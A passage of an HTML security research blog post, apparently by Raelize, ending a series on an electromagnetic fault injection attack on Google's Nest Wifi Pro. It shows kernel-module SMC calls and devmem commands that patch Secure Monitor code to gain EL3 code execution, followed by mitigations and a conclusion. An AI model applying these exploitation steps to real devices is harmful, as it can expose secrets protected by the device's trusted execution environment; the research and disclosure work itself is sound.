+</span></span></code></pre></div><p>After the <code>is_allowed_address</code> function is patched, we can read from <code>0x4ac00000</code> using <code>io_access_read</code> (<code>0x2000501</code>) as shown below.</p>
+<pre tabindex="0"><code>/ # insmod /factory/raelize/lkm/send_t.ko _smcid=0x2000501 _para1=0x4ac00000 &amp;&amp;
+rmmod send_t
+[ 9567.915535] smc (init)!
+[ 9567.915577] 00000000 d29fffe1 4ac00000 00000000 00000000 00000000
+[ 9567.941900] smc (exit)!
+/ #
+</code></pre><p>And, of course, we can write to any arbitrary address using <code>io_access_write</code> as well. Interestingly, it&rsquo;s not possible to overwrite the Secure Monitor (EL3) and Secure OS (S-EL1) using the patched <code>io_access_write</code> function as this memory is not writable for Secure Monitor (EL3). But we can from the REE&hellip;</p>
+<p>Indeed, while the Secure Monitor code region is marked as not writable from the TEE in its MMU configuration, it can be perfectly writable by the REE, as it is in control of its own MMU configuration.</p>
+<h3 id="patch-el3-code-for-arbitrary-code-execution">Patch EL3 code for arbitrary code execution</h3>
+<p>Once the <code>DDR0_MPU</code> XPU is re-configured, nothing is really stopping us from making even more complex patches and getting arbitrary code execution.</p>
+<p>For instance, we decided to patch the code of SMC <code>0x2000109</code> in order to read out the value stored in the <code>TTBR0_EL3</code> register, which can only be read out by the Secure Monitor (EL3) by design. Reading this register proves we execute code in the context of the Secure Monitor (EL3).</p>
+<p>Using <code>devmem</code>, we make the following patches to the SMC <code>0x2000109</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c))` 32 0xd503201f          -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+4))` 32 0xd503201f        -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+8))` 32 0xd503201f        -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+12))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+16))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+20))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+24))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+28))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+32))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+36))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+40))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+44))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+48))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+52))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+56))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+60))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+64))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+68))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+72))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+76))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+80))` 32 0xd503201f       -- NOP</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+84))` 32 0xd53e2000       -- MRS x0, TTBR0_EL3</span>
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem `printf 0x%x $((0x4ac0325c+88))` 32 0xd5033fdf       -- ISB</span>
+</span></span></code></pre></div><p>After <code>0x2000109</code> is patched, we can issue it to trigger our code and read out the <code>TTBR0_EL3</code> register as is shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ <span style="color:#75715e"># insmod /factory/raelize/lkm/send_t.ko _smcid=0x2000109 &amp;&amp; rmmod send_t</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>10116.545320<span style="color:#f92672">]</span> smc <span style="color:#f92672">(</span>init<span style="color:#f92672">)</span>!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>10116.545363<span style="color:#f92672">]</span> 4ac0f000 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>10116.571692<span style="color:#f92672">]</span> smc <span style="color:#f92672">(</span>exit<span style="color:#f92672">)</span>!
+</span></span></code></pre></div><p>The returned value is indeed the address of the EL3 MMU page tables root, which is expected to be stored in <code>TTBR0_EL3</code>. This proves that we are executing code at EL3 (i.e., we read <code>0x4ac0f000</code>).</p>
+<h2 id="video-demonstration">Video demonstration</h2>
+<hr>
+<p>We have created a video of the attack for your entertainment.</p>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/1016076363?h=ac3354be55&amp;badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="Google Wifi Pro: Arbitrary Code Execution at EL3 using EMFI"></iframe></div><script src="https://player.vimeo.com/api/player.js"></script>
+<br>
+<p>Not exactly a Hollywood blockbuster, but it should at least give an idea of all the different steps involved.</p>
+<h2 id="mitigations">Mitigations</h2>
+<hr>
+<p>The Qualcomm IP5018 SoC is vulnerable to EM glitches. Fixing this vulnerability is not possible without an updated hardware architecture that hardens the CPU against FI attacks. Such hardened architectures (e.g., ARM&rsquo;s <a href="https://developer.arm.com/Processors/SecurCore%20SC300">SC300</a>) include features to assure software is executed as intended.</p>
+<p>Nonetheless, at the software security architecture level, several measures could be introduced to increase the difficulty of performing a successful FI attack, especially for code bases of a moderate size, like the Secure Monitor.</p>
+<p>We like to use our <a href="https://raelize.com/blog/raelize-fi-reference-model/">Fault Injection Reference Model (FIRM) </a> [@firm] to describe a successful attack and discuss potential mitigations. We use this model to break down a FI attack into six modular building blocks: <strong>Activate</strong>, <strong>Inject</strong>, <strong>Glitch</strong>, <strong>Fault</strong>, <strong>Exploit</strong> and <strong>Goal</strong>.</p>
+<p>The FI attack we performed, resulting in an arbitrary code execution with the privileges of the Secure Monitor, is described according to our FIRM model in the picture below. The three leftmost building blocks encompass the triggering of the FI vulnerability within a vulnerable target, while the three rightmost building blocks encompass what can be accomplished after a successful fault is introduced.</p>
+<p style="text-align:center;">
+    <img src="/img/google/wifipro/emfi/firm1.png" style="max-width: 80%; width: 600px">
+    <figcaption>Attack described with Raelize's FIRM</figcaption>
+</p>
+<p>Mitigations can be, and should be, stacked in order to increase the complexity of a fault injection attack. Such mitigations can prevent the hardware vulnerability from being triggered, as well as minimize the impact after the vulnerability has been triggered. For example, while it&rsquo;s possible to corrupt instructions using a glitch, mitigations may be in place to prevent achieving anything useful with such a primitive. In the picture below, we describe potential mitigations for the FI attacks we performed.</p>
+<p style="text-align:center;">
+    <img src="/img/google/wifipro/emfi/firm2.png" style="max-width: 80%; width: 600px">
+    <figcaption>Countermeasures described with Raelize's FIRM</figcaption>
+</p>
+<p>Other FI techniques, like voltage glitching and optical glitching (i.e. Laser), may be applicable too. Most of the mitigations introduced before the hardware vulnerability is triggered, are specific to the specific FI technique being used. Hence, to mitigate different FI techniques, different mitigations may be required. The mitigations implemented after the hardware vulnerability is triggered, are likely applicable to all FI techniques, but, on the other hand, they may depend on the fault model being considered (i.e. the mitigations for preventing the exploitation of <code>instruction skipping</code> and <code>instruction corruption</code> are significantly different).</p>
+<p>Besides that Qualcomm&rsquo;s IPQ5018 SoC is vulnerable to EM glitches, we consider the fact that the <code>DDR0_MPU</code> XPU configuration is not locked, a vulnerability by itself. Should such a locking be available, it should be configured to prevent modifications of the XPU configuration, in case an attacker has obtained a write primitive (either by a logical vulnerability or a successful glitch). Configuration vulnerabilities are, in general, difficult to spot, and should be mitigated by implementing a thorough process, including security testing, to assure devices in the field are securely configured.</p>
+<p>It&rsquo;s important to realize that software exploitation mitigations, like <em>Stack Cookies</em>, <em>No-Exec</em>, <em>ASLR</em>, and <em>Control Flow Integrity (CFI)</em>, may make certain FI attacks more difficult. All such mitigations may be irrelevant for the attack described in this report, as we re-configure a hardware security feature at a fixed address. Nonetheless, other FI attacks (e.g. a bypass of a length check with a glitch to make the overflow of a (stack) buffer possible), may become more difficult to be successfully executed in presence of such mitigations. This type of defensive reasoning, which is often not applied for FI attacks (even when FI attacks are included in the threat model), is, in our opinion, extremely important for hardening devices against FI attacks.</p>
+<h2 id="conclusion">Conclusion</h2>
+<hr>
+<p>We successfully demonstrated an EMFI attack on Google&rsquo;s Nest Wifi Pro where we used a single EM glitch to get arbitrary code execution in the context of the Secure Monitor (EL3). We accomplished this by re-configuring the XPU of the DDR to enable us to patch the Secure Monitor (EL3) code from the REE, using a Linux user space utility. An attacker able to execute code at this privilege level is able to fully compromise the security of the device, along with any secrets that are protected by the TEE.</p>
+<p>We combined the following vulnerabilities / weaknesses for the attack:</p>
+<ul>
+<li>Qualcomm IPQ5018 SoC is vulnerable to EM glitches</li>
+<li>DDR XPU configuration is not locked</li>
+<li>Secure Monitor code is not hardened against FI attacks</li>
+</ul>
+<p>We achieved a success rate of 1 successful glitch per 37.5 minutes. Even though this success rate seems low, note that, a single successful glitch is sufficient for executing arbitrary code, of arbitrary size, with the privileges of the Secure Monitor (EL3).</p>
+<p>Moreover, we are confident the success rate can be improved, as there are quite a few variables that impact the success rate, which we did not explore thoroughly (e.g., other locations, improved timing, EM probe tips, etc.).</p>
+<h2 id="end">End</h2>
+<hr>
+<p>This bring us to the end of this series.</p>
+<p>Feel free to reach out for questions or remarks related to this research. As always, we are available to give training on the research we perform, during which you will gain hands-on experience exploiting the vulnerabilities described in this blog post.</p>
+<p>- Raelize<span style="color:yellow">.</span></p>
+</div>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</section>
+
+
+  </div><!-- end Contact Area -->
+<footer id="footer" class="section-bg">
+	<div class="container">
+		<div class="row wow fadeInUp" data-wow-duration="500ms">
+			<div class="col-xl-12">
+
+				<!-- Footer Social Links -->
+				<div class="social-icon">
+					<ul class="list-inline">
+						
+						<li class="list-inline-item"><a href="https://twitter.com/raelizecom" rel="nofollow"><i class="ti-twitter-alt"></i></a></li>
+						
+						<li class="list-inline-item"><a href="https://www.linkedin.com/company/raelize" rel="nofollow"><i class="ti-linkedin"></i></a></li>
+						
+					</ul>
+				</div>
+
+				<!-- copyright -->
+				<div class="copyright text-center">
+					<a href="https://raelize.com/">
+						<img src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42" />
+					</a>
+					<br>
+					<p>Copyright ©2020 Raelize B.V. <br> Powered by <a href=#>Hugo</a> and <a href="https://themefisher.com">Themefisher</a>.</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</footer>
+<!-- /footer -->
+
+<!-- Google Map API -->
+
+
+<!-- JS Plugins -->
+
+<script src="https://raelize.com/plugins/jquery/jquery.min.js"></script>
+
+<script src="https://raelize.com/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="https://raelize.com/plugins/slick/slick.min.js"></script>
+
+<script src="https://raelize.com/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="https://raelize.com/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="https://raelize.com/plugins/lazy-load/lozad.min.js"></script>
+
+<script src="https://raelize.com/plugins/google-map/map.js"></script>
+
+
+<!-- Main Script -->
+
+<script src="https://raelize.com/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>
+
+
+</body>
+
+</html>
